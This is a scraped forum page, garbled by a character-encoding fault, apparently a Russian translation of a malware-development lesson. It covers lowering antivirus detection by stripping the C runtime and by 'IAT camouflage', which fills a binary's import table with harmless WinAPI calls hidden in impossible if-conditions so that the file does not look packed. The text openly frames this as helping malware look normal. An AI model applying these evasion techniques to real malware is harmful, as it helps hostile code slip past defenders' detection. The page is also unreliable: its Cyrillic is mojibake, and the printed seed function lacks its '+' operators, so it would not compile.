		<img src="../../attachments/1746788656147-png.297/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788656147.png"
			title="1746788656147.png"
			width="1286" height="310" loading="lazy" />
	</div><br />
<br />
–ó–∞—Ç–µ–º –≤ IAT –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ –Ω–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788661978.png"
		data-src="https://osint42.org/attachments/1746788661978-png.298/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788661978-png.298/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788661978.png"
			title="1746788661978.png"
			width="1145" height="769" loading="lazy" />
	</div><br />
<br />
–í –±–∏–Ω–∞—Ä–Ω–æ–º —Ñ–∞–π–ª–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ –º–µ–Ω—å—à–µ —Å—Ç—Ä–æ–∫ –±–µ–∑ –æ—Ç–ª–∞–¥–æ—á–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788669818.png"
		data-src="https://osint42.org/attachments/1746788669818-png.299/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788669818-png.299/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788669818.png"
			title="1746788669818.png"
			width="1389" height="750" loading="lazy" />
	</div><br />
<br />
<b>–ù–∞–∫–æ–Ω–µ—Ü, —É–¥–∞–ª–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –º–µ–Ω—å—à–µ–º—É –¥–µ—Ç–µ–∫—Ç—É. </b><br />
<br />
–§–∞–π–ª –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –Ω–∞ VirusTotal –¥–≤–∞–∂–¥—ã: –ø–µ—Ä–≤—ã–π —Ä–∞–∑ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–ø—Ü–∏–∏ &quot;Multi-threaded (/MT)&quot;, —á—Ç–æ–±—ã —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≤—è–∑–∞—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫—É CRT, –∞ –≤—Ç–æ—Ä–æ–π —Ä–∞–∑ –ø–æ—Å–ª–µ –ø–æ–ª–Ω–æ–≥–æ —É–¥–∞–ª–µ–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788677217.png"
		data-src="https://osint42.org/attachments/1746788677217-png.300/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788677217-png.300/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788677217.png"
			title="1746788677217.png"
			width="913" height="224" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788683293.png"
		data-src="https://osint42.org/attachments/1746788683293-png.301/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788683293-png.301/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788683293.png"
			title="1746788683293.png"
			width="911" height="231" loading="lazy" />
	</div><br />
<br />
<b>IAT Camouflage<br />
<br />
–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–£–¥–∞–ª–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ C Runtime –∏–∑ –∫–æ–Ω–µ—á–Ω–æ–≥–æ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—á–∏—Å—Ç–∏—Ç—å IAT –æ—Ç –Ω–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π WinAPI. –û–¥–Ω–∞–∫–æ —ç—Ç–æ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–µ, –µ—Å–ª–∏ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç –æ—á–µ–Ω—å –º–∞–ª–æ —Ñ—É–Ω–∫—Ü–∏–π WinAPI, –æ—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ —ç—Ç–æ —Å–æ–≤–º–µ—â–∞–µ—Ç—Å—è —Å —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ–º API, —á—Ç–æ –º–æ–∂–µ—Ç –¥–∞–∂–µ –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏—é –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π.<br />
<br />
<b>–î–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –≤–∞–∂–Ω–æ, —á—Ç–æ–±—ã —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –≤—ã–≥–ª—è–¥–µ–ª–∞ –Ω–æ—Ä–º–∞–ª—å–Ω–æ.</b> –ò–º–µ—Ç—å —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é —Å —Ñ–∏–∫—Ç–∏–≤–Ω—ã–º IAT –±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ, —á–µ–º –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π. –≠—Ç–æ—Ç –º–æ–¥—É–ª—å –ø–æ–¥—Ä–æ–±–Ω–æ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏—Ç —ç—Ç—É –∫–æ–Ω—Ü–µ–ø—Ü–∏—é.<br />
<br />
–î–∞–≤–∞–π—Ç–µ –Ω–∞—á–Ω–µ–º —Å –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ —Å –∏–º–µ–Ω–µ–º IatCamouflage.exe, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫—É CRT –∏ –±—ã–ª —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ —Ç–æ–º—É, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–Ω–æ –≤—ã—à–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
int main() {

      // –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ–µ –æ–∂–∏–¥–∞–Ω–∏–µ
    WaitForSingleObject((HANDLE)-1, INFINITE);
    return 0;
}</code></pre>
	</div>
</div><br />
–ö–æ–≥–¥–∞ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, Process Hacker –≤—ã–¥–µ–ª–∏—Ç –ø—Ä–æ—Ü–µ—Å—Å —Ä–æ–∑–æ–≤—ã–º —Ü–≤–µ—Ç–æ–º –∏ –æ—Ç–æ–±—Ä–∞–∑–∏—Ç –∑–∞–º–µ—Ç–∫—É, –∫–æ–≥–¥–∞ –º—ã—à—å –Ω–∞–≤–æ–¥–∏—Ç—Å—è –Ω–∞ –ø—Ä–æ—Ü–µ—Å—Å. Process Hacker –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç, —á—Ç–æ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª —É–ø–∞–∫–æ–≤–∞–Ω –∏–∑-–∑–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏—è –∏–º–ø–æ—Ä—Ç–∞ –≤ IAT.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788692294.png"
		data-src="https://osint42.org/attachments/1746788692294-png.302/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788692294-png.302/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788692294.png"
			title="1746788692294.png"
			width="1086" height="320" loading="lazy" />
	</div><br />
<br />
–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ IatCamouflage.exe –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç –æ–¥–Ω—É —Ñ—É–Ω–∫—Ü–∏—é —Å –ø–æ–º–æ—â—å—é dumpbin.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788698320.png"
		data-src="https://osint42.org/attachments/1746788698320-png.303/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788698320-png.303/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788698320.png"
			title="1746788698320.png"
			width="1432" height="522" loading="lazy" />
	</div><br />
<br />
<b>–ú–∞–Ω–∏–ø—É–ª—è—Ü–∏—è IAT</b><br />
<br />
–ú–∞–Ω–∏–ø—É–ª—è—Ü–∏—è IAT –º–æ–∂–µ—Ç –±—ã—Ç—å –ª–µ–≥–∫–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –¥–æ–±—Ä–æ–∂–µ–ª–∞—Ç–µ–ª—å–Ω—ã—Ö WinAPI, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –∏–∑–º–µ–Ω—è—é—Ç –ø–æ–≤–µ–¥–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, –≤—ã–∑—ã–≤–∞—è WinAPI —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ NULL –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É—è WinAPI –Ω–∞ —Ñ–∏–∫—Ç–∏–≤–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –ø–æ–≤–ª–∏—è—é—Ç –Ω–∞ –ø—Ä–æ–≥—Ä–∞–º–º—É. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —ç—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –º–æ–≥—É—Ç —Ä–∞–∑–º–µ—â–∞—Ç—å—Å—è –≤ if-—É—Å–ª–æ–≤–∏—è—Ö, <b>–∫–æ—Ç–æ—Ä—ã–µ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –±—É–¥—É—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è.</b><br />
–¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä—ã –º–æ–≥—É—Ç –∏–∑–º–µ–Ω—è—Ç—å —Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ &quot;—É–¥–∞–ª–µ–Ω–∏–µ –º–µ—Ä—Ç–≤–æ–≥–æ –∫–æ–¥–∞&quot;. –≠—Ç–æ —Å–≤–æ–π—Å—Ç–≤–æ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –≤–ª–∏—è–µ—Ç –Ω–∞ —Ä–∞–±–æ—Ç—É –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
<b>–ü—Ä–∏–º–µ—Ä —É–¥–∞–ª–µ–Ω–∏—è –º–µ—Ä—Ç–≤–æ–≥–æ –∫–æ–¥–∞</b><br />
<br />
–í —Å–ª–µ–¥—É—é—â–µ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞ –≤—ã–∑—ã–≤–∞—é—Ç—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ñ—É–Ω–∫—Ü–∏–π WinAPI –≤–Ω—É—Ç—Ä–∏ if-—É—Å–ª–æ–≤–∏—è, –∫–æ—Ç–æ—Ä–æ–µ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int z = 4;

// –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ–µ if-—É—Å–ª–æ–≤–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è
if (z &gt; 5) {

    // –°–ª—É—á–∞–π–Ω—ã–µ –¥–æ–±—Ä–æ–∂–µ–ª–∞—Ç–µ–ª—å–Ω—ã–µ WinAPI
    unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
    i = GetLastError();
    i = SetCriticalSectionSpinCount(NULL, NULL);
    i = GetWindowContextHelpId(NULL);
    i = GetWindowLongPtrW(NULL, NULL);
    i = RegisterClassW(NULL);
    i = IsWindowVisible(NULL);
    i = ConvertDefaultLocale(NULL);
    i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
    i = IsDialogMessageW(NULL, NULL);
}</code></pre>
	</div>
</div><br />
–ï—Å–ª–∏ –ø—Ä–æ–µ–∫—Ç Visual Studio –Ω–µ –∏–º–µ–µ—Ç –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –∏ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω—ã–π –∫–æ–¥, —Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –Ω–µ –±—É–¥—É—Ç –≤–∏–¥–Ω—ã –≤ IAT –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –ö–æ–º–ø–∏–ª—è—Ç–æ—Ä –∑–Ω–∞–µ—Ç, —á—Ç–æ if-—É—Å–ª–æ–≤–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å, –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –≤–µ—Å—å –∫–æ–¥ if-—É—Å–ª–æ–≤–∏—è –Ω–µ –≤–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ —Ç–æ–º—É, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –Ω–µ –±—É–¥—É—Ç –≤ IAT –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –°—É—â–µ—Å—Ç–≤—É—é—Ç –¥–≤–∞ —Å–ø–æ—Å–æ–±–∞ —Ä–µ—à–µ–Ω–∏—è —ç—Ç–æ–π –ø—Ä–æ–±–ª–µ–º—ã:<br />
<ol>
<li data-xf-list-type="ol">–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∫–æ–¥–∞.</li>
<li data-xf-list-type="ol">–û–±–º–∞–Ω –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞, —á—Ç–æ–±—ã –æ–Ω –¥—É–º–∞–ª, —á—Ç–æ —ç—Ç–æ—Ç –∫–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è.</li>
</ol><b>–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∫–æ–¥–∞</b><br />
<br />
–î–ª—è —ç—Ç–æ–≥–æ –º–µ—Ç–æ–¥–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–æ—Å—Ç–æ –æ—Ç–∫–ª—é—á–∏—Ç—å –æ–ø—Ü–∏—é –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ Visual Studio, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ. –≠—Ç–æ –æ—Ç–∫–ª—é—á–∏—Ç —Å–≤–æ–π—Å—Ç–≤–æ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ &quot;—É–¥–∞–ª–µ–Ω–∏–µ –º–µ—Ä—Ç–≤–æ–≥–æ –∫–æ–¥–∞&quot;, —á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Ç–æ–º—É, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –±—É–¥—É—Ç –≤–∏–¥–Ω—ã –≤ IAT. –û–¥–Ω–∞–∫–æ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –Ω–∞ –±–æ–ª–µ–µ –∫—Ä—É–ø–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º–∞—Ö –º–æ–∂–µ—Ç –Ω–µ–≥–∞—Ç–∏–≤–Ω–æ —Å–∫–∞–∑–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏, –ø–æ—Å–∫–æ–ª—å–∫—É –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –±–æ–ª—å—à–µ –Ω–µ –æ–ø—Ç–∏–º–∏–∑–∏—Ä—É–µ—Ç —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –∏ —Å–∫–æ—Ä–æ—Å—Ç—å –∫–æ–¥–∞. –ü–æ—ç—Ç–æ–º—É –ø—Ä–æ–≥—Ä–∞–º–º–∞ –º–æ–∂–µ—Ç –ø–æ—Ç—Ä–µ–±–ª—è—Ç—å –±–æ–ª—å—à–µ –ø–∞–º—è—Ç–∏ –∏–ª–∏ —Ä–∞–±–æ—Ç–∞—Ç—å –º–µ–¥–ª–µ–Ω–Ω–µ–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788708650.png"
		data-src="https://osint42.org/attachments/1746788708650-png.304/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788708650-png.304/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788708650.png"
			title="1746788708650.png"
			width="1194" height="612" loading="lazy" />
	</div><br />
<br />
<br />
<b>–û–±–º–∞–Ω –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞</b><br />
<br />
–î–ª—è —ç—Ç–æ–≥–æ –º–µ—Ç–æ–¥–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª–æ–≥–∏–∫—É, —á—Ç–æ–±—ã –æ–±–º–∞–Ω—É—Ç—å –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –∏ –∑–∞—Å—Ç–∞–≤–∏—Ç—å –µ–≥–æ –¥—É–º–∞—Ç—å, —á—Ç–æ if-—É—Å–ª–æ–≤–∏–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ–ø—É—Å—Ç–∏–º—ã–º. –í –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ª–æ–≥–∏–∫–∞, –∫–æ—Ç–æ—Ä–∞—è –¥–µ–ª–∞–µ—Ç —Å–ª–æ–∂–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä—É, –±—É–¥–µ—Ç –ª–∏ if-—É—Å–ª–æ–≤–∏–µ –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è, —á—Ç–æ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –µ–≥–æ –≤–∫–ª—é—á–∏—Ç—å —ç—Ç—É –ª–æ–≥–∏–∫—É –≤ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª, –¥–∞–∂–µ –µ—Å–ª–∏ if-—É—Å–ª–æ–≤–∏–µ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –±—É–¥–µ—Ç —É–¥–æ–≤–ª–µ—Ç–≤–æ—Ä–µ–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ seed –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏
int RandomCompileTimeSeed(void)
{
    return &#039;0&#039; * -40271
        __TIME__[7] * 1
        __TIME__[6] * 10
        __TIME__[4] * 60
        __TIME__[3] * 600
        __TIME__[1] * 3600
        __TIME__[0] * 36000;
}

// –§—É–Ω–∫—Ü–∏—è-–ø—É—Å—Ç—ã—à–∫–∞, –¥–µ–ª–∞—é—â–∞—è if-—É—Å–ª–æ–≤–∏–µ –≤ &#039;IatCamouflage&#039; –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–º
PVOID Helper(PVOID *ppAddress) {

    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
    if (!pAddress)
        return NULL;

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–µ—Ä–≤—ã—Ö 4 –±–∞–π—Ç–æ–≤ –≤ pAddress —Ä–∞–≤–Ω—ã–º–∏ —Å–ª—É—á–∞–π–Ω–æ–º—É —á–∏—Å–ª—É (–º–µ–Ω—å—à–µ 255)
    *(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –ø–æ —É–∫–∞–∑–∞—Ç–µ–ª—é –∏ –≤–æ–∑–≤—Ä–∞—Ç –µ–≥–æ
    *ppAddress = pAddress;
    return pAddress;
}

// –§—É–Ω–∫—Ü–∏—è, –∏–º–ø–æ—Ä—Ç–∏—Ä—É—é—â–∞—è WinAPI, –Ω–æ –Ω–∏–∫–æ–≥–¥–∞ –∏—Ö –Ω–µ –∏—Å–ø–æ–ª—å–∑—É—é—â–∞—è
VOID IatCamouflage() {

    PVOID        pAddress    = NULL;
    int*        A            = (int*)Helper(&amp;pAddress);

    // –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ–µ if-—É—Å–ª–æ–≤–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è
    if (*A &gt; 350) {

        // –ù–µ—Å–∫–æ–ª—å–∫–æ —Å–ª—É—á–∞–π–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π WinAPI
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
    }

    // –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –≤ &#039;Helper&#039; –±—É—Ñ–µ—Ä–∞
    HeapFree(GetProcessHeap(), 0, pAddress);
}</code></pre>
	</div>
</div><br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–æ–º–µ–Ω—Ç–æ–≤, —á—Ç–æ–±—ã –æ–±–ª–µ–≥—á–∏—Ç—å –ø–æ–Ω–∏–º–∞–Ω–∏–µ —ç—Ç–æ–≥–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ –∫–æ–¥–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è RandomCompileTimeSeed –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–ª—É—á–∞–π–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–∞–∫—Ä–æ—Å–∞ <b>TIME</b>.<br />
<br />
–§—É–Ω–∫—Ü–∏—è Helper –≤—ã–¥–µ–ª—è–µ—Ç –∫—É—á—É –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø–µ—Ä–≤—ã–µ 4 –±–∞–π—Ç–∞ —Ä–∞–≤–Ω—ã–º–∏ –∑–Ω–∞—á–µ–Ω–∏—é RandomCompileTimeSeed() % 0xFF, —á—Ç–æ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ —á–∏—Å–ª–∞, —á—Ç–æ–±—ã –æ–Ω–æ –±—ã–ª–æ –º–µ–Ω—å—à–µ 0xFF (–≤ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ) –∏–ª–∏ 255 (–≤ –¥–µ—Å—è—Ç–∏—á–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ).<br />
<br />
